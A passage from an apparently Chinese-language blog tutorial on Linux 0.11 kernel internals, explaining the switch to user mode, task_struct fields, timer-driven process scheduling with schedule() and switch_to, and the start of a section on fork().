class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define move_to_user_mode() \</span><br><span class="line">_asm &#123; \</span><br><span class="line">    _asm mov eax,esp \</span><br><span class="line">    _asm push 00000017h \ ; 给 SS 赋值</span><br><span class="line">    _asm push eax \  ; ESP</span><br><span class="line">    _asm pushfd \  ; EFLAGS</span><br><span class="line">    _asm push 0000000fh \ ; 给 CS 赋值</span><br><span class="line">    _asm push offset l1 \ ; EIP</span><br><span class="line">    _asm iretd &#x2F;* 执行中断返回指令*&#x2F; \</span><br><span class="line">_asm l1: mov eax,17h \</span><br><span class="line">    _asm mov ds,ax \</span><br><span class="line">    _asm mov es,ax \</span><br><span class="line">    _asm mov fs,ax \</span><br><span class="line">    _asm mov gs,ax \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以 CS 为例，被赋值成了 0x0000000f，用二进制表示就是 <strong>0000000000001111</strong></p><p>最后两位是 11 表示特权级为 3 ，用户态。而刚刚也说了，CS 寄存器里的特权级，表示 CPL，即处理器特权级。</p><p>所以通过 iretd 返回后，CS 的值就变成了这个，当前处理器特权级，也就变成了用户态特权级。</p><h4 id="除了改变特权级之外"><a href="#除了改变特权级之外" class="headerlink" title="除了改变特权级之外"></a><strong>除了改变特权级之外</strong></h4><p>除了改变特权级之外，还做了什么事呢？</p><p>再来看看段选择子的结构：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690375697415/fe57c42fd9f6978e0e816797f2b13b03aeb3e24f.png" alt="640 (3)"></p><p>刚刚说了 CS 寄存器为 <strong>0000000000001111</strong>，最后两位表示用户态。</p><p>倒数第三位 TI 表示，全面的描述符索引，是从 GDT(全局描述符表) 还是从 LDT(局部描述符表) 中取，1 表示 LDT，0 表示 GDT ，这里是从局部描述符表里取。</p><p>而如今的 GDT 和 LDT 表被设计成了这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648695739362874/90250a7c9b635645920ba46ad55e23d300459707.png" alt="640 (1)"></p><p>接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define move_to_user_mode() \</span><br><span class="line">_asm &#123; \</span><br><span class="line">...</span><br><span class="line">_asm push 00000017h \ ; 给 SS 赋值</span><br><span class="line">...</span><br><span class="line">    _asm push offset l1 \ ; EIP</span><br><span class="line">    _asm iretd &#x2F;* 执行中断返回指令*&#x2F; \</span><br><span class="line">_asm l1: mov eax,17h \</span><br><span class="line">    _asm mov ds,ax \</span><br><span class="line">    _asm mov es,ax \</span><br><span class="line">    _asm mov fs,ax \</span><br><span class="line">    _asm mov gs,ax \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 EIP 赋值为 l1，使得 CPU 跳转到那，执行 l1 处的代码，这里 ss 和 ds 都被赋值成了 0x17 ，对应的二进制是 <strong>10111</strong>，可以发现是用户态特权级，对应的描述符是 LDT。</p><p>兜兜转转记住一句话就行：<strong>数据访问只能高特权级访问低特权级，代码跳转只能同特权级跳转，要想实现特权级转换，可以通过中断和中断返回来实现。</strong></p><p><strong>总结一下 move_to_user_mode() 干的事：通过伪造一个中断和中断返回，巧妙地从内核态切换到了用户态。</strong></p><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>先说说进程调度的本质是什么：</p><p>假如有两段代码被加载在内存中，进程调度就是让 CPU 一会去程序 1 位置处运行一段时间，一会又去进程 2 位置处运行一段时间。</p><p>怎么实现在几个程序之间来回切换呢？可以由一个不受任何程序控制的，第三方的不可抗力，每隔一段时间就中断一下 CPU 的运行，然后跳转到一个特殊的程序那里，这个程序通过某种方式获取到 CPU 下一个要运行的程序的地址，然后跳转过去。</p><p>这个不受任何程序控制的，第三方的不可抗力，就是由定时器触发的<strong>时钟中断</strong>(sched_init)。</p><p>而那个特殊的程序，就是<strong>进程调度函数</strong>了。</p><p>我们用 <strong>tast_struct</strong> 结构来支持这个流程，用来记录各个流程的信息，比如 CPU 上一次执行到哪里了。</p><h4 id="上下文环境"><a href="#上下文环境" class="headerlink" title="上下文环境"></a><strong>上下文环境</strong></h4><p>每个程序最终的本质就是执行指令。这个过程会涉及<strong>寄存器</strong>，<strong>内存</strong>和<strong>外设端口</strong>。</p><p><strong>内存</strong>：内存还有可能设计成相互错开的，互不干扰，比如进程 1 你就用 0<del>1K 的内存空间，进程 2 就用 1K</del>2K 的内存空间，咱谁也别影响谁。</p><p>虽然有点浪费空间，而且对程序员十分不友好，但起码还是能实现的。</p><p><strong>寄存器</strong>：寄存器总共就那几个，肯定做不到互不干扰，有可能程序 1 往 eax 里写入了一个值，程序 2 又往 eax 里写值就会出错。</p><p>所以最稳妥的做法就是，<strong>每次切换进程时，都把当前这些寄存器的值存到一个地方，以便之后切换回来的时候恢复。</strong></p><p>Linux 0.11 就是这样做的，每个进程的结构 task_struct 里面，有一个叫 <strong>tss</strong> 的结构，存储的就是 CPU 这些<strong>寄存器</strong>的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span>    back_link;  <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    esp0;</span><br><span class="line">    <span class="keyword">long</span>    ss0;        <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    esp1;</span><br><span class="line">    <span class="keyword">long</span>    ss1;        <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    esp2;</span><br><span class="line">    <span class="keyword">long</span>    ss2;        <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    cr3;</span><br><span class="line">    <span class="keyword">long</span>    eip;</span><br><span class="line">    <span class="keyword">long</span>    eflags;</span><br><span class="line">    <span class="keyword">long</span>    eax,ecx,edx,ebx;</span><br><span class="line">    <span class="keyword">long</span>    esp;</span><br><span class="line">    <span class="keyword">long</span>    ebp;</span><br><span class="line">    <span class="keyword">long</span>    esi;</span><br><span class="line">    <span class="keyword">long</span>    edi;</span><br><span class="line">    <span class="keyword">long</span>    es;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    cs;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    ss;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    ds;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    fs;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    gs;     <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    ldt;        <span class="comment">/* 16 high bits zero */</span></span><br><span class="line">    <span class="keyword">long</span>    trace_bitmap;   <span class="comment">/* bits: trace 0, bitmap 16-31 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">i387_struct</span> <span class="title">i387</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里有个细节：</p><p>tss 结构里有一个 <strong>cr3</strong>，表示 cr3 寄存器里存的值，而 cr3 寄存器又是指向页目录表首地址的。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648710491949143/1eb48617718a75062ee9e24b2181b4beaa9b3275.png" alt="640 (2)"></p><p>当 cr3 不同，指向的页目录表就不同，整个页表结构也就不同，线性地址到物理地址的映射关系也就不同。</p><p>也就是说，通过 cr3 就完全可以不需要之前所说的不同程序通过存储在不同的内存空间以互不干扰，而是建立不同的映射关系，由操作系统来建立不同的页目录表并替换 cr3 寄存器即可。</p><p>这也可以理解为，保存了<strong>内存映射的上下文信息</strong>。</p><p>当然 Linux 0.11 并不是通过替换 cr3 寄存器来实现内存互不干扰的，它的实现更为简单，这是后话了。</p><p>所以保存上下文就可以理解成：app点击一个按钮进入一个新的界面，也要保存你是在哪个屏幕跳过来的等等信息，以便你点击返回的时候能正确跳回，如果不存肯定就无法正确跳回了。</p><h4 id="运行时间信息"><a href="#运行时间信息" class="headerlink" title="运行时间信息"></a><strong>运行时间信息</strong></h4><p>如何判断一个进程该让出 CPU，切换到下一个进程呢？</p><p>答案是给进程一个属性，叫<strong>剩余时间片</strong>，每触发一次时钟中断，都 <strong>-1</strong>，如果减到 0，就触发切换进程的操作。</p><p>在 Linux 0.11 里，这个属性就是 <strong>counter</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">long</span> counter;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而他的用法也非常简单，就是每次中断都判断一下是否到 0 了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">long</span> cpl)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 当前线程还有剩余时间片，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> ((--current-&gt;counter)&gt;<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 若没有剩余时间片，调度</span></span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还没到 0，就直接返回，相当于这次时钟中断什么也没做，仅仅是给当前进程的时间片属性做了 -1 操作。</p><p>如果已经到 0 了，就触发<strong>进程调度</strong>，选择下一个进程并使 CPU 跳转到那里运行。</p><p>进程调度的逻辑就是在 <strong>schedule</strong> 函数里，怎么调，我们先不管。</p><h4 id="“优先级”"><a href="#“优先级”" class="headerlink" title="“优先级”"></a><strong>“优先级”</strong></h4><p>counter 应该初始化为多少呢？</p><p>需要有个属性来记录这个值，这个值越大，counter 就越大，那么每次轮到这个进程时，在 CPU 中运行的时间就越长，也就是这个进程比其他进程得到了更多 CPU 运行的时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">long</span> counter;</span><br><span class="line">    <span class="keyword">long</span> priority;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次一个进程初始化时，都会把 counter 赋值为 priority。</p><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a><strong>进程状态</strong></h4><p>我们总要不断优化以适应不同场景的用户需求。</p><p>假设有这样一个场景，一个进程中有一个读取硬盘的操作，发起请求后，要等好久才能得到硬盘的终端信号。这个时候该进程占着 CPU 也没啥用，就会主动放弃 CPU 的执行权，把自己标记为等待中。把 CPU 的执行权限留给其他进程。</p><p>这个等待中的状态用 <strong>state</strong> 属性记录，通俗一点就是 state 记录了<strong>进程的状态</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> state;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个进程状态在 linux 0.11 里有五种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_RUNNING          0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_INTERRUPTIBLE    1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_UNINTERRUPTIBLE  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_ZOMBIE           3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_STOPPED          4</span></span><br></pre></td></tr></table></figure><p>现在已经可以完成简单的进程调度任务了，有表示状态的 <strong>state</strong>，表示剩余时间片的 <strong>counter</strong>，表示优先级的 <strong>priority</strong>，和表示上下文信息的 <strong>tss</strong>。当然还有其他字段，到时候再说。</p><p>看看 Linux 0.11 进程结构的全部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* these are hardcoded - don&#x27;t touch */</span></span><br><span class="line">    <span class="keyword">long</span> state; <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">    <span class="keyword">long</span> counter;</span><br><span class="line">    <span class="keyword">long</span> priority;</span><br><span class="line">    <span class="keyword">long</span> signal;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigaction</span>[32];</span></span><br><span class="line">    <span class="keyword">long</span> blocked;   <span class="comment">/* bitmap of masked signals */</span></span><br><span class="line"><span class="comment">/* various fields */</span></span><br><span class="line">    <span class="keyword">int</span> exit_code;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_code,end_code,end_data,brk,start_stack;</span><br><span class="line">    <span class="keyword">long</span> pid,father,pgrp,session,leader;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> uid,euid,suid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> gid,egid,sgid;</span><br><span class="line">    <span class="keyword">long</span> alarm;</span><br><span class="line">    <span class="keyword">long</span> utime,stime,cutime,cstime,start_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> used_math;</span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line">    <span class="keyword">int</span> tty;        <span class="comment">/* -1 if no tty, so it must be signed */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> umask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">pwd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">root</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">executable</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> close_on_exec;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>[<span class="title">NR_OPEN</span>];</span></span><br><span class="line"><span class="comment">/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>[3];</span></span><br><span class="line"><span class="comment">/* tss for this task */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这一节主要讲了创建新进程的过程，先补充了<strong>进程调度的本质</strong>是<strong>进程之间的来回切换</strong>，然后说了<strong>触发进程调度的方式</strong>是通过<strong>时钟中断</strong>，再通过<strong>进程调度函数</strong>跳至其他进程；进程调度的过程中，会用<strong>tast_struct</strong>结构来记录整个过程，之后的很多属性都会保存在这个结构体里；会通过 <strong>tss</strong> 来保存寄存器的值以保证上下文环境一致；会以<strong>counter</strong>减为 0 的条件触发切换进程的操作；会通过 <strong>priority</strong> 记录 <strong>counter</strong> 的初始值来表示多个进程之间的”优先级”(数越大说明占用CPU的时间越长，”优先级”也就越高)；会用 <strong>state</strong> 记录进程的状态。</p><h4 id="进程调度的全过程"><a href="#进程调度的全过程" class="headerlink" title="进程调度的全过程"></a>进程调度的全过程</h4><p>在 <code>/kernel/sched.c</code>的 <strong>sched_init</strong> 中，程序开启了定时器，每隔一段时间就会给 CPU 发起一个中断信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LATCH (1193180/HZ)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    outb_p(<span class="number">0x36</span>,<span class="number">0x43</span>);      <span class="comment">/* binary, mode 3, LSB/MSB, ch 0 */</span></span><br><span class="line">    outb_p(LATCH &amp; <span class="number">0xff</span> , <span class="number">0x40</span>);    <span class="comment">/* LSB */</span></span><br><span class="line">    outb(LATCH &gt;&gt; <span class="number">8</span> , <span class="number">0x40</span>);    <span class="comment">/* MSB */</span></span><br><span class="line">    set_intr_gate(<span class="number">0x20</span>,&amp;timer_interrupt);</span><br><span class="line">    outb(inb_p(<span class="number">0x21</span>)&amp;~<span class="number">0x01</span>,<span class="number">0x21</span>);</span><br><span class="line">    set_system_gate(<span class="number">0x80</span>,&amp;system_call);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间间隔被设置成了 10 ms，也就是 100 Hz。</p><p>中断号被设置成了 <strong>0x20</strong>，中断处理函数是 <strong>timer_interrupt</strong></p><p>来看看 timer_interrupt 部分源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;kernel&#x2F;system_call.s</span><br><span class="line"></span><br><span class="line">_timer_interrupt:</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; 增加系统滴答数</span><br><span class="line">    incl _jiffies ; 自增1</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; 调用函数 do_timer</span><br><span class="line">    call _do_timer</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>jiffies 自增1，调用函数 do_timer</p><p>看看 do_timer 部分源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/kernel/sched.c</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">long</span> cpl)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 当前线程还有剩余时间片，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> ((--current-&gt;counter)&gt;<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    current-&gt;counter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!cpl) <span class="keyword">return</span>; <span class="comment">//判断特权级</span></span><br><span class="line">    <span class="comment">// 若没有剩余时间片，调度</span></span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果上一个进程时间不为 0 ，直接返回，否则置当前进程 counter 为 0 ，然后判断当前特权级，为 0 (内核态)直接返回，不为 0 就调度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#/kernel/sched.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, next, c;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        c = <span class="number">-1</span>;</span><br><span class="line">        next = <span class="number">0</span>;</span><br><span class="line">        i = NR_TASKS;</span><br><span class="line">        p = &amp;task[NR_TASKS];</span><br><span class="line">        <span class="keyword">while</span> (--i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!*--p)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">                c = (*p)-&gt;counter, next = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line">            <span class="keyword">if</span> (*p)</span><br><span class="line">                (*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">                        (*p)-&gt;priority;</span><br><span class="line">    &#125;</span><br><span class="line">    switch_to(next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分成几部分看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">c = (*p)-&gt;counter, next = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分是遍历找出<strong>正在运行状态</strong>的且 <strong>counter 最大</strong>的进程号 next。    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)</span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">(*p)-&gt;priority;</span><br></pre></td></tr></table></figure><p>如果系统有正在运行状态的进程 counter 不为 0 ，或者系统中没有一个正在运行的任务存在(c = -1)，退出循环。</p><p>如果系统所有正在运行状态的进程 counter 为 0，就将所有进程的 counter 重新赋值为 <code>counter/2 + priority</code>，然后再回到 while 循环。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch_to(next);</span><br></pre></td></tr></table></figure><p>最后拿到一个进程号 next，调用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#define switch_to(n) &#123;\</span><br><span class="line">struct &#123;long a,b;&#125; __tmp; \</span><br><span class="line">__asm__(&quot;cmpl %%ecx,_current\n\t&quot; \</span><br><span class="line">    &quot;je 1f\n\t&quot; \</span><br><span class="line">    &quot;movw %%dx,%1\n\t&quot; \</span><br><span class="line">    &quot;xchgl %%ecx,_current\n\t&quot; \</span><br><span class="line">    &quot;ljmp %0\n\t&quot; \</span><br><span class="line">    &quot;cmpl %%ecx,_last_task_used_math\n\t&quot; \</span><br><span class="line">    &quot;jne 1f\n\t&quot; \</span><br><span class="line">    &quot;clts\n&quot; \</span><br><span class="line">    &quot;1:&quot; \</span><br><span class="line">    ::&quot;m&quot; (*&amp;__tmp.a),&quot;m&quot; (*&amp;__tmp.b), \</span><br><span class="line">    &quot;d&quot; (_TSS(n)),&quot;c&quot; ((long) task[n])); \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是进程切换最最底层的代码，看不懂没关系，只要知道最终主要干了一件事：ljmp 到新进程的 tss 段处。</p><p>什么意思？</p><p>CPU 规定，如果 ljmp 指令后面跟的是 tss 段，会由硬件将当前各个寄存器的值保存在当前进程的 tss 中，并将<strong>新进程</strong>的 tss 信息加载到各个寄存器。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648783950536952/ed8a3ec9b87a2d57ac9004408823bd0f61fb2bf7.png" alt="640"></p><p>简单来说就是：<strong>保存当前进程上下文，恢复下一个进程的上下文，跳过去</strong></p><p>总结：定时器每 10 ms会触发一次时钟中断信号，这个信号会使 CPU 查找中断向量表，触发中断处理函数 <strong>timer_interrupt</strong>，timer_interrupt 又会调用函数 do_timer，do_timer 函数会判断上一个进程 counter 是否为 0 ，如果不为 0 ，直接返回，反之设置当前进程 counter 为 0 ，且如果特权级不在内核态，调用 schedule ，进行进程调度。schedule 函数会找到<strong>正在运行</strong>的且 <strong>counter 最大</strong>的进程号，并将其放入 switch_to 函数，switch_to 会保存当前进程的上下文，同时使 CPU 跳转到这个进程的偏移地址处。</p><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static _inline _syscall0(int,fork)</span><br><span class="line"></span><br><span class="line">#define _syscall0(type,name) \</span><br><span class="line">type name(void) \</span><br><span 